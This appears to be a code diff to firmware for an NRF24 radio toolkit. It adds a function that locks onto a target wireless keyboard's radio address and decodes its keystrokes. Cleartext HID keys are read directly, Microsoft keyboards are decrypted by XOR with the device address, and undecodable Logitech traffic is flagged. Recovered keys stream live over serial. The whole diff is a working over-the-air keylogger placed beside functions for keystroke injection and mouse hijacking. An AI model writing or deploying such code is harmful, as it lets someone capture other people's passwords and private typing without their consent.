@@ -935,6 +935,179 @@ bool nrf_hijack_inject(const String &addrHex, int channelIn, const String &actio
     return true;
 }
 
+// Fuller HID usage-id -> character map (shift-aware). Returns 0 for keys with no
+// simple printable form (caller renders those as [TOKENS]).
+static char rkHidChar(uint8_t mod, uint8_t key) {
+    bool shift = mod & 0x22; // left (0x02) or right (0x20) shift
+    if (key >= 0x04 && key <= 0x1d) return (char)((shift ? 'A' : 'a') + (key - 0x04));
+    if (key >= 0x1e && key <= 0x26) {
+        const char *n = "123456789";
+        const char *s = "!@#$%^&*(";
+        return shift ? s[key - 0x1e] : n[key - 0x1e];
+    }
+    switch (key) {
+        case 0x27: return shift ? ')' : '0';
+        case 0x2c: return ' ';
+        case 0x2d: return shift ? '_' : '-';
+        case 0x2e: return shift ? '+' : '=';
+        case 0x2f: return shift ? '{' : '[';
+        case 0x30: return shift ? '}' : ']';
+        case 0x31: return shift ? '|' : '\\';
+        case 0x33: return shift ? ':' : ';';
+        case 0x34: return shift ? '"' : '\'';
+        case 0x35: return shift ? '~' : '`';
+        case 0x36: return shift ? '<' : ',';
+        case 0x37: return shift ? '>' : '.';
+        case 0x38: return shift ? '?' : '/';
+    }
+    return 0;
+}
+
+// Render a HID (mod,key) as a printable token for the log line.
+static String rkKeyToken(uint8_t mod, uint8_t key) {
+    char c = rkHidChar(mod, key);
+    if (c) return String(c);
+    switch (key) {
+        case 0x28: return "\\n";
+        case 0x2a: return "[BKSP]";
+        case 0x2b: return "[TAB]";
+        case 0x29: return "[ESC]";
+        case 0x4c: return "[DEL]";
+        case 0x4f: return "[RIGHT]";
+        case 0x50: return "[LEFT]";
+        case 0x51: return "[DOWN]";
+        case 0x52: return "[UP]";
+        default: return "[0x" + String(key, HEX) + "]";
+    }
+}
+
+// Heuristic: does this 8-byte block look like a plausible HID keyboard report?
+// (modifier < 0x08 i.e. only ctrl/shift/alt/gui bits, reserved byte 0, a key in
+// the usable usage range.)
+static bool rkLooksLikeHid(const uint8_t *p, uint8_t len, uint8_t modOff, uint8_t keyOff) {
+    if (len <= keyOff) return false;
+    uint8_t mod = p[modOff], key = p[keyOff];
+    if (mod & 0x88) return false;            // bits we don't expect set together
+    if (key == 0) return true;               // key release — valid
+    return key >= 0x04 && key <= 0x73;       // a real usage id
+}
+
+// Headless keystroke sniffer: pin RX to a target address+channel and decode HID
+// keystrokes. Cleartext HID is decoded directly; Microsoft 2.4GHz keyboards are
+// XOR-decrypted with the address (best-effort); encrypted (Logitech AES Unifying)
+// payloads are flagged. Decoded keys are streamed to serialDevice as they arrive
+// (so the companion passthrough relays them live). action arg `secs` bounds it.
+bool nrf_readkeys(const String &addrHex, int channelIn, int secs) {
+    uint8_t addr[5];
+    if (!parseAddr(addrHex, addr)) {
+        if (serialDevice) serialDevice->println("[NRF] bad addr (need 10 hex chars)");
+        return false;
+    }
+    if (!nrf_start()) {
+        if (serialDevice) serialDevice->println("[NRF] radio init failed");
+        return false;
+    }
+    if (secs < 1) secs = 10;
+    if (secs > 120) secs = 120;
+    uint8_t channel = clampChan(channelIn);
+    auto vend = guessVendor(addr);
+    bool tryMs = true, isLogi = vend.first.startsWith("Logitech");
+
+    NRFradio.stopListening();
+    NRFradio.setAutoAck(false);
+    NRFradio.disableCRC();
+    NRFradio.enableDynamicPayloads();
+    NRFradio.setAddressWidth(5);
+    NRFradio.setDataRate(RF24_2MBPS);
+    NRFradio.setPALevel(RF24_PA_MAX);
+    NRFradio.setChannel(channel);
+    NRFradio.openReadingPipe(1, addr);
+    NRFradio.startListening();
+
+    if (serialDevice)
+        serialDevice->printf("[NRF] readkeys %s ch=%u vendor=%s for %ds\n",
+                             addrToString(addr).c_str(), channel, vend.first.c_str(), secs);
+
+    unsigned long endAt = millis() + (unsigned long)secs * 1000;
+    uint8_t buf[32];
+    uint8_t lastKey = 0;
+    uint32_t pkts = 0, keys = 0, enc = 0;
+    bool tried2 = false; // also try 1MBPS if nothing on 2MBPS
+
+    while (millis() < endAt) {
+        uint8_t pipe = 0;
+        while (NRFradio.available(&pipe)) {
+            uint8_t len = NRFradio.getDynamicPayloadSize();
+            if (len < 3 || len > 32) {
+                NRFradio.flush_rx();
+                break;
+            }
+            NRFradio.read(buf, len);
+            pkts++;
+
+            // 1) cleartext generic HID at [0]=mod [2]=key
+            if (rkLooksLikeHid(buf, len, 0, 2)) {
+                uint8_t mod = buf[0], key = buf[2];
+                if (key && key != lastKey) {
+                    keys++;
+                    if (serialDevice)
+                        serialDevice->printf("[KEY] %s  (hid key=0x%02X mod=0x%02X)\n",
+                                             rkKeyToken(mod, key).c_str(), key, mod);
+                }
+                lastKey = key;
+                continue;
+            }
+            // 2) Microsoft-style: XOR the payload with the address, retry HID
+            if (tryMs) {
+                uint8_t dec[32];
+                for (uint8_t i = 0; i < len; i++) dec[i] = buf[i] ^ addr[i % 5];
+                // MS frames carry the scancode near offset 7; probe a couple offsets
+                int offs[][2] = {{6, 7}, {0, 2}, {1, 2}};
+                for (auto &o : offs) {
+                    if (rkLooksLikeHid(dec, len, o[0], o[1])) {
+                        uint8_t mod = dec[o[0]], key = dec[o[1]];
+                        if (key && key != lastKey) {
+                            keys++;
+                            if (serialDevice)
+                                serialDevice->printf("[KEY/ms] %s  (xor key=0x%02X mod=0x%02X)\n",
+                                                     rkKeyToken(mod, key).c_str(), key, mod);
+                        }
+                        lastKey = key;
+                        goto next;
+                    }
+                }
+            }
+            // 3) couldn't decode — likely encrypted (e.g. Logitech AES) or non-HID
+            enc++;
+            if (enc <= 5 && serialDevice) { // a few raw samples for inspection
+                String h;
+                for (uint8_t i = 0; i < len && i < 16; i++) {
+                    char b[4];
+                    snprintf(b, sizeof(b), "%02X", buf[i]);
+                    h += b;
+                }
+                serialDevice->printf("[ENC?] len=%u %s%s\n", len, h.c_str(),
+                                     isLogi ? " (logitech-aes?)" : "");
+            }
+        next:;
+        }
+        // if totally silent halfway through, flip data rate once (devices vary)
+        if (!tried2 && pkts == 0 && millis() > endAt - (unsigned long)secs * 500) {
+            tried2 = true;
+            NRFradio.stopListening();
+            NRFradio.setDataRate(RF24_1MBPS);
+            NRFradio.startListening();
+        }
+        delay(2);
+    }
+    NRFradio.stopListening();
+    NRFradio.powerDown();
+    if (serialDevice)
+        serialDevice->printf("[NRF] readkeys done: %lu packets, %lu keys, %lu undecoded\n",
+                             (unsigned long)pkts, (unsigned long)keys, (unsigned long)enc);
+    return true;
+}
+
 void nrf_toolkit() { nrf_hijack(); }
 
 void nrf_mousejack() {
